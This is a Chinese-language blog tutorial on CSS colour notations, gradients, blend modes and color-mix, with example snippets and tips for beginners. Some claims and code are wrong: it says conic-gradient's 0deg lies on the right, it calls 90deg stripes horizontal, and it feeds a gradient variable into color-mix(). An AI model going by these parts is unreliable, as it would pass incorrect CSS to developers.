                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<p>CSS 颜色与渐变，绝对是我刚学前端时的“颜值瓶颈”——最开始只会抄设计稿上的hex色值，调个主题色hover效果，要反复改几十次色值才能勉强满意；写渐变要么过渡得生硬又突兀，要么角度写错导致整体错位，混合模式更是看都不敢看，总觉得太复杂。直到踩够了坑、慢慢摸透了每种用法才发现，hex、rgb、hsl各有各的方便，渐变随手写就能出高级感，混合模式用对了还能省很多事。今天就把我实打实的实操经验、踩过的坑，还有整理的干货分享给大家，新手跟着学，能少走很多弯路。</p>
<h2 data-id="heading-0">一、颜色表示法：按需选择，我常用这3种（避坑指南）</h2>
<p>CSS 颜色表示法其实有一大堆，关键字、hex、rgb、hsl、oklch 等等，但我日常开发里，真正用得上的就3种——hex、rgb、hsl。oklch 虽然色域广、颜色更鲜艳，但兼容性还不够好，我目前项目里还没敢用；关键字也就偶尔用个transparent，其他的基本不碰。新手真不用贪多，把这3种核心用法吃透，就能应对99%的开发场景。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 关键字：简单但不灵活，仅用在透明、基础色，我很少用 */</span>
<span class="hljs-attribute">color</span>: red;
<span class="hljs-attribute">background</span>: transparent; <span class="hljs-comment">/* 常用，透明背景 */</span>

<span class="hljs-comment">/* hex：最常用，简洁好复制，6位、8位（含透明度）都常用 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>; <span class="hljs-comment">/* 3位简写，等价于#333333，适合基础灰色系 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-number">#333333</span>; <span class="hljs-comment">/* 6位标准写法，精准度高，日常最常用 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-number">#3333</span>; <span class="hljs-comment">/* 4位简写 + 透明度，33是透明度，等价于#33333333 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-number">#33333380</span>; <span class="hljs-comment">/* 8位写法，最后两位80=50%透明度，我做半透明常用这个 */</span>

<span class="hljs-comment">/* rgb / rgba：直观控制红绿蓝，带透明度，新手易理解 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">51</span>, <span class="hljs-number">51</span>, <span class="hljs-number">51</span>); <span class="hljs-comment">/* 无透明，和#333一致 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">51</span>, <span class="hljs-number">51</span>, <span class="hljs-number">51</span>, <span class="hljs-number">0.5</span>); <span class="hljs-comment">/* 传统透明写法 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">51</span> <span class="hljs-number">51</span> <span class="hljs-number">51</span> / <span class="hljs-number">0.5</span>);  <span class="hljs-comment">/* 新语法，空格分隔，更简洁，我现在优先用 */</span>

<span class="hljs-comment">/* hsl / hsla：色相、饱和度、明度，调色超方便，做主题色首选 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">hsl</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100%</span>, <span class="hljs-number">50%</span>);    <span class="hljs-comment">/* 红：色相0，饱和度100%，明度50% */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">hsl</span>(<span class="hljs-number">120</span>, <span class="hljs-number">100%</span>, <span class="hljs-number">50%</span>);  <span class="hljs-comment">/* 绿：色相120 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">hsl</span>(<span class="hljs-number">240</span>, <span class="hljs-number">100%</span>, <span class="hljs-number">50%</span>);  <span class="hljs-comment">/* 蓝：色相240 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">hsl</span>(<span class="hljs-number">0</span> <span class="hljs-number">0%</span> <span class="hljs-number">20%</span> / <span class="hljs-number">0.5</span>);  <span class="hljs-comment">/* 新语法 + 透明度，灰色50%透明 */</span>

<span class="hljs-comment">/* oklch：现代色空间，色域更广，颜色更鲜艳，但兼容性一般，我暂不用 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">oklch</span>(<span class="hljs-number">0.6</span> <span class="hljs-number">0.2</span> <span class="hljs-number">250</span>);
</code></pre>
<p><strong>我的实操心得+踩坑吐槽</strong>：这几种表示法，我踩过不少冤枉路，后来总结了一套固定用法，再也没出过错，新手直接照搬就行：</p>
<ul>
<li>日常固定色（边框、基础文字色），首选hex：最简洁，设计稿给的色值基本都是hex，直接复制粘贴就行，不用额外转换，能省不少时间，也避免转换出错。</li>
<li>需要半透明效果（遮罩、悬浮层、半透明背景），必用rgb新语法：比8位hex直观太多，0.5就是50%透明度，一眼就能看懂。我早期傻愣愣用8位hex，每次都要算透明度对应的十六进制值，经常算错，改来改去浪费时间。</li>
<li>做主题色、hover变色、手动调色，一定要用hsl：这绝对是调色神器！改H（色相）就能切换颜色，比如从红色改成蓝色，不用重新找色值；改S（饱和度）调鲜艳程度，改L（明度）调明暗，比如按钮hover要变亮，只需要把L调高一点，比hex、rgb反复试色高效10倍。</li>
<li>避坑点：4位hex简写（#3333）新手千万别乱⽤，只有最后两位是透明度，很容易和6位色值混淆，我早期就因为简写看错了，把半透明色写成了实色；还有rgb新语法，“/”后面别加空格，不然部分低版本浏览器会不兼容，踩过一次坑就记牢了。</li>
</ul>
<h2 data-id="heading-1">二、线性渐变 linear-gradient：日常最常用，按钮/背景首选</h2>
<p>线性渐变是我日常用得最多的渐变效果，没有之一！核心特别简单，就是“沿某个方向，从一种颜色过渡到另一种颜色”，按钮、卡片背景、页面装饰，用它都能轻松做出高级感。新手只要记住“方向+色标”这两个关键点，就能快速上手，我早期踩的坑，基本都集中在方向写错、色标位置没设对这两点上。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 基础用法：方向 + 色标（最少两种颜色） */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to right, red, blue); <span class="hljs-comment">/* 从左到右，红渐变到蓝 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, red, blue); <span class="hljs-comment">/* 用角度表示方向，90deg=to right，更精准 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to bottom right, red, blue); <span class="hljs-comment">/* 从左上到右下，对角线渐变 */</span>

<span class="hljs-comment">/* 多个色标：实现多颜色过渡，更丰富 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to right, red, yellow <span class="hljs-number">50%</span>, blue); <span class="hljs-comment">/* 红→黄（中间位置）→蓝 */</span>

<span class="hljs-comment">/* 色标位置：手动控制过渡节点，避免过渡生硬，我做精致渐变必用 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to right, red <span class="hljs-number">0%</span>, blue <span class="hljs-number">50%</span>, green <span class="hljs-number">100%</span>); <span class="hljs-comment">/* 0%、50%、100% 是过渡位置 */</span>

<span class="hljs-comment">/* 实际场景1：按钮渐变（我项目里常用的写法） */</span>
<span class="hljs-selector-class">.btn-primary</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#667eea</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#764ba2</span> <span class="hljs-number">100%</span>); <span class="hljs-comment">/* 135deg角度，更有立体感 */</span>
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}

<span class="hljs-comment">/* 实际场景2：条纹背景（高频需求，我早期写错过background-size） */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(
  <span class="hljs-number">90deg</span>,
  <span class="hljs-number">#333</span> <span class="hljs-number">0%</span>,
  <span class="hljs-number">#333</span> <span class="hljs-number">50%</span>,
  <span class="hljs-number">#666</span> <span class="hljs-number">50%</span>,
  <span class="hljs-number">#666</span> <span class="hljs-number">100%</span>
);
<span class="hljs-attribute">background-size</span>: <span class="hljs-number">20px</span> <span class="hljs-number">100%</span>; <span class="hljs-comment">/* 关键：控制条纹宽度，20px是条纹总宽，漏写就没有条纹效果 */</span>
</code></pre>
<p><strong>高频坑点（全是我踩过的冤枉路）</strong> ：1. 方向混淆：to right是从左到右，to left是从右到左，我早期曾把to right写成to left，渐变方向完全反了，页面整体错乱，排查了半天才发现是这个小问题；2. 条纹背景漏写background-size：我第一次写条纹，只写了渐变代码，没写background-size，结果页面显示的是单一渐变，没有任何条纹效果，还以为是代码写错了，折腾了好久；3. 色标位置不写：默认是均匀过渡，想要条纹那种生硬分界，必须给相邻色标设相同位置（比如50%、50%），不然过渡会很柔和，达不到想要的效果。</p>
<h2 data-id="heading-2">三、径向渐变 radial-gradient：做光晕、圆形背景超合适</h2>
<p>径向渐变和线性渐变不一样，它是“从中心点向外扩散”的，自带层次感，特别适合做圆形背景、卡片hover光晕、头像边框这些点缀性的效果，能悄悄提升页面质感。它的核心也简单，就是控制“形状+圆心位置+色标”，不用写复杂代码，简单调一调就能出效果。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 基础用法：圆形，从中心向外渐变（默认椭圆，circle设为圆形） */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(circle, red, blue); <span class="hljs-comment">/* 圆形，红→蓝 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(ellipse at center, red, blue); <span class="hljs-comment">/* 椭圆（默认），中心点 */</span>

<span class="hljs-comment">/* 指定圆心位置：精准控制渐变扩散起点，我做局部光晕常用 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(circle at <span class="hljs-number">20%</span> <span class="hljs-number">80%</span>, yellow, red); <span class="hljs-comment">/* 圆心在左侧下方（20%宽度，80%高度） */</span>

<span class="hljs-comment">/* 色标控制：和线性渐变一致，可手动设位置，实现多颜色扩散 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(circle, red <span class="hljs-number">0%</span>, blue <span class="hljs-number">50%</span>, green <span class="hljs-number">100%</span>); <span class="hljs-comment">/* 红（中心）→蓝→绿（边缘） */</span>
</code></pre>
<p>我的实操小技巧：径向渐变不用搞太复杂，简单的圆形渐变+半透明色，就能做出很好的效果。比如卡片hover时的光晕，我就用radial-gradient(circle, rgba(102, 126, 234, 0.3), transparent)，再配合background-size调一下范围，就能做出柔和又自然的光晕，比单纯用box-shadow质感好太多。</p>
<h2 data-id="heading-3">四、锥形渐变 conic-gradient：色轮、饼图专属</h2>
<p>锥形渐变我早期接触得很少，一直觉得它没用，直到做数据可视化、需要写简单饼图时才发现，它简直是“神器”！它和径向渐变的“向外扩散”完全不同，是“围绕中心点旋转”的环形过渡，最适合做色轮、饼图、加载动画，不用写复杂的定位和嵌套，几行代码就能搞定。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 基础用法：色轮效果（多颜色环形过渡） */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">conic-gradient</span>(red, yellow, green, blue, red); <span class="hljs-comment">/* 从红开始，环形过渡，最后回到红 */</span>

<span class="hljs-comment">/* 从指定角度开始渐变：控制渐变的起始位置 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">conic-gradient</span>(from <span class="hljs-number">90deg</span>, red, blue); <span class="hljs-comment">/* 从90度位置开始，红→蓝 */</span>

<span class="hljs-comment">/* 实际场景：饼图（最常用，精准控制每个扇形角度） */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">conic-gradient</span>(red <span class="hljs-number">0deg</span> <span class="hljs-number">90deg</span>, blue <span class="hljs-number">90deg</span> <span class="hljs-number">180deg</span>, green <span class="hljs-number">180deg</span> <span class="hljs-number">360deg</span>); <span class="hljs-comment">/* 红（0-90度）、蓝（90-180度）、绿（180-360度） */</span>
</code></pre>
<p><strong>避坑提醒（血的教训）</strong> ：锥形渐变的角度的是“环形角度”，0deg在右侧，顺时针递增，和线性渐变的角度逻辑完全不一样！我第一次做饼图，就按线性渐变的角度逻辑来写，结果扇形位置全错了，排查了好久才找到问题；另外，做饼图时，相邻色标的结束角度和开始角度一定要衔接好（比如90deg接90deg），不然两个扇形之间会出现缝隙，特别丑。</p>
<h2 data-id="heading-4">五、重复渐变：条纹、网格等重复效果，不用写多余标签</h2>
<p>重复渐变真的太省代码了！它的核心就是“把渐变效果重复排列”，不用写多个div嵌套，就能做出条纹、网格、点阵这些重复样式，我做表格条纹、页面背景网格时，基本都用它，比手动写多个div方便太多。重点就是控制好“渐变长度+重复间距”，就能做出想要的效果。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 重复线性渐变：常用做水平/垂直条纹，我做表格条纹必用 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">repeating-linear-gradient</span>(
  <span class="hljs-number">90deg</span>, <span class="hljs-comment">/* 方向：水平条纹 */</span>
  <span class="hljs-number">#333</span>,
  <span class="hljs-number">#333</span> <span class="hljs-number">10px</span>, <span class="hljs-comment">/* 第一个条纹：#333，宽度10px */</span>
  <span class="hljs-number">#666</span> <span class="hljs-number">10px</span>, <span class="hljs-comment">/* 衔接位置，和上一个结束位置一致，避免缝隙 */</span>
  <span class="hljs-number">#666</span> <span class="hljs-number">20px</span> <span class="hljs-comment">/* 第二个条纹：#666，宽度10px，总重复宽度20px */</span>
);

<span class="hljs-comment">/* 重复径向渐变：常用做圆形点阵、环形重复效果 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">repeating-radial-gradient</span>(circle, red, red <span class="hljs-number">10px</span>, blue <span class="hljs-number">10px</span>, blue <span class="hljs-number">20px</span>); <span class="hljs-comment">/* 圆形重复，红→蓝，每个重复单元20px */</span>
</code></pre>
<p>我的实操小技巧：重复渐变的关键，就是“相邻色标的位置要衔接好”，比如前一个颜色在10px结束，下一个颜色就从10px开始，这样两个渐变之间才不会出现缝隙；另外，重复单元的总宽度（比如20px），决定了条纹的密集程度，宽度越小，条纹越密，根据设计稿灵活调整就好，不用死记硬背。</p>
<h2 data-id="heading-5">六、混合模式 mix-blend-mode：高级叠加效果，提升页面质感</h2>
<p>混合模式我早期一直不敢碰，总觉得它太复杂，怕用错了把页面颜色搞乱，直到后来做Banner图、需要文字和背景叠加时才发现，它能做出特别高级的效果，而且没那么难。核心就是“让当前元素，和它下方的内容产生叠加反应”，比如正片叠底、滤色，选对模式，就能轻松做出高级感，不用写多余的样式。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 元素混合：让当前元素（叠加层）与下方元素叠加 */</span>
<span class="hljs-selector-class">.overlay</span> { <span class="hljs-comment">/* 叠加层，比如遮罩、文字 */</span>
  <span class="hljs-attribute">mix-blend-mode</span>: multiply;   <span class="hljs-comment">/* 正片叠底：常用做图片暗化遮罩，我最常用 */</span>
  <span class="hljs-attribute">mix-blend-mode</span>: screen;    <span class="hljs-comment">/* 滤色：常用做图片提亮，适合浅色叠加 */</span>
  <span class="hljs-attribute">mix-blend-mode</span>: overlay;   <span class="hljs-comment">/* 叠加：保留底层细节，同时叠加上层颜色，高级感强 */</span>
  <span class="hljs-attribute">mix-blend-mode</span>: difference; <span class="hljs-comment">/* 差值：颜色对比强烈，适合特殊效果，少用 */</span>
}

<span class="hljs-comment">/* 背景混合：让元素的背景（比如渐变+图片）内部叠加 */</span>
<span class="hljs-attribute">background-blend-mode</span>: multiply; <span class="hljs-comment">/* 背景内部叠加 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(red, blue), <span class="hljs-built_in">url</span>(<span class="hljs-string">bg.jpg</span>); <span class="hljs-comment">/* 渐变与背景图叠加，配合上面的混合模式 */</span>
</code></pre>
<p><strong>避坑提醒（我踩过的蠢坑）</strong> ：1. 混合模式必须“下方有内容”才能生效！我第一次用mix-blend-mode，给一个单独的遮罩层加了这个属性，结果一点效果都没有，折腾了半天，才发现遮罩层下方是空的，没有可叠加的内容；2. 别滥用混合模式！它会改变元素原本的颜色呈现，普通页面尽量不用，只在Banner、详情页这种需要高级效果的地方用，不然很容易导致颜色错乱，影响页面可读性。</p>
<h2 data-id="heading-6">七、color-mix：颜色混合新语法，主题色变体超方便</h2>
<p>color-mix 绝对是CSS新增语法里，我最爱的一个！它能快速混合两种颜色，不用手动计算色值，省了大量试色的时间，尤其适合做主题色变体——比如按钮hover变亮、禁用色、浅色系背景，用它来写，高效又精准，比手动调hex、hsl方便太多，我现在做主题色相关的样式，全靠它。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 基础用法：混合两个颜色，指定混合比例 */</span>
<span class="hljs-attribute">color</span>: <span class="hljs-built_in">color-mix</span>(in srgb, red <span class="hljs-number">50%</span>, blue); <span class="hljs-comment">/* 在srgb色空间，红50% + 蓝50%，混合出紫色 */</span>
<span class="hljs-attribute">background</span>: <span class="hljs-built_in">color-mix</span>(in hsl, <span class="hljs-number">#333</span> <span class="hljs-number">80%</span>, white); <span class="hljs-comment">/* 深灰80% + 白20%，混合出浅灰色 */</span>

<span class="hljs-comment">/* 实际场景：按钮hover变亮（我项目里的常用写法） */</span>
<span class="hljs-selector-class">.btn</span> {
  <span class="hljs-attr">--primary</span>: <span class="hljs-number">#667eea</span>; <span class="hljs-comment">/* 主题色变量 */</span>
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--primary);
}
<span class="hljs-selector-class">.btn</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-comment">/* 主题色85% + 白15%，实现hover变亮，不用重新找色值 */</span>
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">color-mix</span>(in srgb, <span class="hljs-built_in">var</span>(--primary) <span class="hljs-number">85%</span>, white);
}
</code></pre>
<p>我的实操心得：color-mix 不用记复杂语法，核心就是“指定色空间+混合比例”。建议优先用in srgb，兼容性更好；混合比例也不用写两个，只写一个就行，另一个会自动补全（比如红50%，蓝就默认是50%）。做主题色变体时，混合白色就能变亮，混合黑色就能变暗，比手动调hsl的明度更精准，而且全站主题色能保持统一，不会出现色差。</p>
<h2 data-id="heading-7">八、我的实际示例（直接套用，少踩坑）</h2>
<p>结合我日常开发的高频场景，整理了4个实操写法，新手可以直接复制套用，全是我项目里常用的，避开了所有我踩过的坑，不用再自己瞎琢磨：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 场景1：卡片渐变边框（高级感拉满，不用额外写边框标签） */</span>
<span class="hljs-selector-class">.card</span> {
  <span class="hljs-attribute">background</span>: white;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">24px</span>; <span class="hljs-comment">/* 给内部留空间，避免内容贴边框 */</span>
}
<span class="hljs-selector-class">.card</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">""</span>;
  <span class="hljs-attribute">position</span>: absolute;
  inset: <span class="hljs-number">0</span>; <span class="hljs-comment">/* 全屏覆盖父元素 */</span>
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">1px</span>; <span class="hljs-comment">/* 边框宽度，关键 */</span>
  <span class="hljs-attribute">border-radius</span>: inherit; <span class="hljs-comment">/* 继承父元素圆角，避免圆角错位 */</span>
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#667eea</span>, <span class="hljs-number">#764ba2</span>); <span class="hljs-comment">/* 渐变边框颜色 */</span>
  <span class="hljs-comment">/* 关键：实现只显示边框，不覆盖内部背景 */</span>
  -webkit-<span class="hljs-attribute">mask</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">#fff</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>) content-box, <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">#fff</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>);
  <span class="hljs-attribute">mask-composite</span>: exclude;
}

<span class="hljs-comment">/* 场景2：文字渐变（标题常用，高级不生硬） */</span>
<span class="hljs-selector-class">.gradient-text</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#667eea</span>, <span class="hljs-number">#764ba2</span>); <span class="hljs-comment">/* 渐变颜色 */</span>
  -webkit-<span class="hljs-attribute">background-clip</span>: text; <span class="hljs-comment">/* 把背景裁剪到文字上，webkit前缀兼容移动端 */</span>
  -webkit-text-fill-<span class="hljs-attribute">color</span>: transparent; <span class="hljs-comment">/* 文字颜色透明，显示背景渐变 */</span>
  <span class="hljs-attribute">background-clip</span>: text; <span class="hljs-comment">/* 标准写法 */</span>
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
}

<span class="hljs-comment">/* 场景3：简单饼图（数据可视化常用，不用复杂组件） */</span>
<span class="hljs-selector-class">.pie-chart</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>; <span class="hljs-comment">/* 圆形容器 */</span>
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">conic-gradient</span>(red <span class="hljs-number">0deg</span> <span class="hljs-number">90deg</span>, blue <span class="hljs-number">90deg</span> <span class="hljs-number">180deg</span>, green <span class="hljs-number">180deg</span> <span class="hljs-number">360deg</span>);
}

<span class="hljs-comment">/* 场景4：带hover效果的渐变按钮（日常高频） */</span>
<span class="hljs-selector-class">.btn-primary</span> {
  <span class="hljs-attr">--primary</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#667eea</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#764ba2</span> <span class="hljs-number">100%</span>);
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--primary);
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  <span class="hljs-attribute">cursor</span>: pointer;
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
}
<span class="hljs-selector-class">.btn-primary</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-comment">/* 混合主题色和白色，实现hover变亮，同时保留渐变 */</span>
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">color-mix</span>(in srgb, <span class="hljs-built_in">var</span>(--primary) <span class="hljs-number">90%</span>, white);
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>); <span class="hljs-comment">/* 轻微上浮，提升交互感 */</span>
}
</code></pre>
<h2 data-id="heading-8">九、个人总结：颜色与渐变避坑核心（新手必看）</h2>
<ol>
<li>
<p>颜色表示法：hex 日常凑活用、rgb 专门做透明、hsl 负责调色，oklch 暂不考虑，新手聚焦这3种，足够应对所有场景，不用贪多求全；</p>
</li>
<li>
<p>线性渐变：方向+色标是核心，按钮、背景首选它，写条纹千万别漏写background-size，不然等于白写；</p>
</li>
<li>
<p>径向渐变：做圆形、光晕的神器，控制好圆心位置，就能悄悄提升页面层次感，不用搞复杂样式；</p>
</li>
<li>
<p>锥形渐变：色轮、饼图专属，记住它的角度是环形角度，相邻色标衔接好，避免出现缝隙；</p>
</li>
<li>
<p>重复渐变：相邻色标位置衔接好，能省很多嵌套代码，做条纹、网格超方便；</p>
</li>
<li>
<p>混合模式：按需选用，正片叠底、叠加最常用，记住“下方要有内容”，不然没用，别滥用；</p>
</li>
<li>
<p>color-mix：主题色变体神器，混合白色/黑色实现亮暗变化，不用手动试色，高效又精准。</p>
</li>
</ol>
<p>其实颜色与渐变真的不难，我最开始也是只会抄hex、写简单线性渐变，踩了无数坑，才慢慢熟练起来。核心就是“多试、多总结”，不用一开始就追求复杂效果，先掌握基础用法，再逐步尝试高级效果，慢慢就能做出有质感的页面。配合前3篇讲的盒模型、单位知识，CSS布局+美化，就能轻松拿捏。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>